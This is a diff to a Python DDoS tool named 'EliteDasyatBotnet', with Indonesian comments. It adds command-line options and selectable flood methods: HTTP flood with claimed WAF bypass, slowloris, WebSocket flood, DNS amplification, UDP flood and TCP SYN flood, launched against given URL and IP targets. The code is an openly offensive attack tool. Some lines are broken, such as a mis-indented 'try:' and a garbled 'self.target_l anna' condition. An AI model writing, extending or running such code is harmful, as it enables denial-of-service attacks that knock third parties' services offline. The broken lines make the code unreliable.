@@ -12,6 +12,7 @@ import time
 import websocket
 from fake_useragent import UserAgent
 from typing import Dict, List
+import argparse
 
 # Logging Setup
 logging.basicConfig(
@@ -21,11 +22,12 @@ logging.basicConfig(
 )
 
 class EliteDasyatBotnet:
-    def __init__(self, target_l7: str, target_l4: str, duration: int, max_connections: int = 1000):
-        self.target_l7 = target_l7.rstrip('/')
-        self.target_l4 = target_l4
+    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: List[str] = None):
+        self.target_l7 = target_l7.rstrip('/') if target_l7 else None
+        self.target_l4 = target_l4 if target_l4 else None
         self.duration = duration
         self.max_connections = max_connections
+        self.methods = methods if methods else ["http", "slowloris", "websocket", "dns", "udp", "tcp_syn"]
         self.ua = UserAgent()
         self.headers = {
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -89,6 +91,9 @@ class EliteDasyatBotnet:
 
     async def http_flood(self):
         """L7: HTTP flood canggih dengan polymorphic payload dan WAF bypass."""
+        if not self.target_l7:
+            logging.error("L7 HTTP flood requires target_l7")
+            return
         async with aiohttp.ClientSession() as session:
             end_time = asyncio.get_event_loop().time() + self.duration
             while asyncio.get_event_loop().time() < end_time:
@@ -114,6 +119,9 @@ class EliteDasyatBotnet:
 
     async def slowloris(self):
         """L7: Slowloris untuk exhaust resource server."""
+        if not self.target_l7:
+            logging.error("L7 Slowloris requires target_l7")
+            return
         async with aiohttp.ClientSession() as session:
             end_time = asyncio.get_event_loop().time() + self.duration
             while asyncio.get_event_loop().time() < end_time:
@@ -137,6 +145,9 @@ class EliteDasyatBotnet:
 
     async def websocket_flood(self):
         """L7: WebSocket flood untuk exhaust koneksi."""
+        if not self.target_l7:
+            logging.error("L7 WebSocket flood requires target_l7")
+            return
         end_time = asyncio.get_event_loop().time() + self.duration
         while asyncio.get_event_loop().time() < end_time:
             try:
@@ -161,7 +172,7 @@ class EliteDasyatBotnet:
         resolver.nameservers = self.dns_servers
         end_time = asyncio.get_event_loop().time() + self.duration
         while asyncio.get_event_loop().time() < end_time:
-            try:
+        try:
                 domain = f"{uuid.uuid4().hex}.example.com"
                 answer = await asyncio.get_event_loop().run_in_executor(
                     None, lambda: resolver.resolve(domain, 'TXT')
@@ -174,6 +185,9 @@ class EliteDasyatBotnet:
 
     async def udp_flood(self, port: int = 80):
         """L4: UDP flood untuk simulasi QUIC-like."""
+        if not self.target_l4:
+            logging.error("L4 UDP flood requires target_l4")
+            return
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         end_time = asyncio.get_event_loop().time() + self.duration
         while asyncio.get_event_loop().time() < end_time:
@@ -190,6 +204,9 @@ class EliteDasyatBotnet:
 
     async def tcp_syn_flood(self, port: int = 80):
         """L4: TCP SYN flood untuk exhaust koneksi."""
+        if not self.target_l4:
+            logging.error("L4 TCP SYN flood requires target_l4")
+            return
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setblocking(False)
         end_time = asyncio.get_event_loop().time() + self.duration
@@ -204,31 +221,41 @@ class EliteDasyatBotnet:
         sock.close()
 
     async def run(self):
-        """Jalankan serangan multi-layer."""
+        """Jalankan serangan berdasarkan metode yang dipilih."""
+        if not self.target_l anna and not self.target_l4:
+            logging.error("At least one target (L7 or L4) is required")
+            return
         self.active_connections = self.max_connections
         tasks = []
-        # Distribusi tugas: 40% HTTP flood, 20% slowloris, 15% WebSocket, 15% DNS, 10% UDP, 10% TCP SYN
-        tasks.extend([self.http_flood() for _ in range(int(self.max_connections * 0.4))])
-        tasks.extend([self.slowloris() for _ in range(int(self.max_connections * 0.2))])
-        tasks.extend([self.websocket_flood() for _ in range(int(self.max_connections * 0.15))])
-        tasks.extend([self.dns_amplification() for _ in range(int(self.max_connections * 0.15))])
-        tasks.extend([self.udp_flood() for _ in range(int(self.max_connections * 0.1))])
-        tasks.extend([self.tcp_syn_flood() for _ in range(int(self.max_connections * 0.1))])
-        logging.info(f"Starting elite dasyat botnet on L7: {self.target_l7}, L4: {self.target_l4} with {len(tasks)} tasks")
+        method_tasks = {
+            "http": self.http_flood,
+            "slowloris": self.slowloris,
+            "websocket": self.websocket_flood,
+            "dns": self.dns_amplification,
+            "udp": self.udp_flood,
+            "tcp_syn": self.tcp_syn_flood
+        }
+        for method in self.methods:
+            if method in method_tasks:
+                tasks.extend([method_tasks[method]() for _ in range(int(self.max_connections * (0.4 if method == "http" else 0.15 if method in ["slowloris", "websocket", "dns"] else 0.1))])
+        if not tasks:
+            logging.error("No valid methods selected")
+            return
+        logging.info(f"Starting elite dasyat botnet on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'} with methods: {self.methods}")
         await asyncio.gather(*tasks)
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
         logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
-async def main(target_l7: str, target_l4: str, duration: int):
-    botnet = EliteDasyatBotnet(target_l7, target_l4, duration)
+async def main(target_l7: str, target_l4: str, duration: int, methods: List[str]):
+    botnet = EliteDasyatBotnet(target_l7, target_l4, duration, methods=methods)
     await botnet.run()
 
 if __name__ == "__main__":
-    import sys
-    if len(sys.argv) != 4:
-        print("Usage: python p.py <target_l7_url> <target_l4_ip> <duration_seconds>")
-        sys.exit(1)
-    target_l7_url = sys.argv[1]
-    target_l4_ip = sys.argv[2]
-    duration = int(sys.argv[3])
-    asyncio.run(main(target_l7_url, target_l4_ip, duration))
+    parser = argparse.ArgumentParser(description="Elite Dasyat Botnet")
+    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
+    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
+    parser.add_argument("duration", type=int, default=60, help="Duration in seconds")
+    parser.add_argument("--methods", type=str, default="http,slowloris,websocket,dns,udp,tcp_syn", help="Comma-separated methods (http,slowloris,websocket,dns,udp,tcp_syn)")
+    args = parser.parse_args()
+    methods = args.methods.split(",")
+    asyncio.run(main(args.target_l7, args.target_l4, args.duration, methods))
